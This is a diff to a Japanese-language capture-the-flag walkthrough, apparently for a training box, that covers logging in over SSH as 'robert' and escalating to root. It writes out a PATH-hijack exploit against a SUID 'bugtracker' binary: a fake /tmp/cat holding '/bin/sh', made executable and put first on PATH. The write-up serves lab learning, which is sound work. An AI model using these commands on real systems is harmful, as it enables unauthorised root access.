@@ -86,21 +86,38 @@ db.php内のユーザ情報を取得
 
 
 # 6.SSH connect
- `ssh robert@$ip`
- 
+
  SSHを使いrobertユーザで接続
+
+`ssh robert@$ip`
  
  ![390a02dd703ddf2bc96b56b66b8e4849.png](../_resources/390a02dd703ddf2bc96b56b66b8e4849.png)
+ 
+ログインしているユーザが所属しているグループを発見
 
-権限昇格に使用できると思われるツールを発見
+$ id
+
+![e94d29e48284f38c2fa98e56063bb7b6.png](../_resources/e94d29e48284f38c2fa98e56063bb7b6.png)
+
+bug trackerの場所を確認
+
+$locate bugtracker
 
 ![54ea79e33302eb51168b56b83b5b19ab.png](../_resources/54ea79e33302eb51168b56b83b5b19ab.png)
 
-Bug Trackerは/root/reportsディレクリ内にcatを使用することを確認
+bugtrackerがSUIDを所持している事を確認
+
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+
+![8c75ab37f25b8269981b3bab3d31fe41.png](../_resources/8c75ab37f25b8269981b3bab3d31fe41.png)
+
+Bug Trackerは/root/reportsディレクリ内に無条件でcatを使用することを確認
 
 ![f5982646e76314fb6222c9e8a0486f5e.png](../_resources/f5982646e76314fb6222c9e8a0486f5e.png)
 
-catに"bin/sh"を入れrootまでのパスを設定する
+
+tmpディレクトリに移動、不正なcatファイルを作成し実行権限を付与
+環境変数に作成したcatファイルが優先して選ばれるように書き換えを行う
 
 $ cd /tmp
 
@@ -108,9 +125,9 @@ $ echo "/bin/sh" > cat
 
 $ chmod +x cat  
 
-$ export PATH/tmp:PATH
+$ export PATH=/tmp:$PATH
 
-$ echo PATH
+$ echo $PATH
 
 $ bugtracker
 
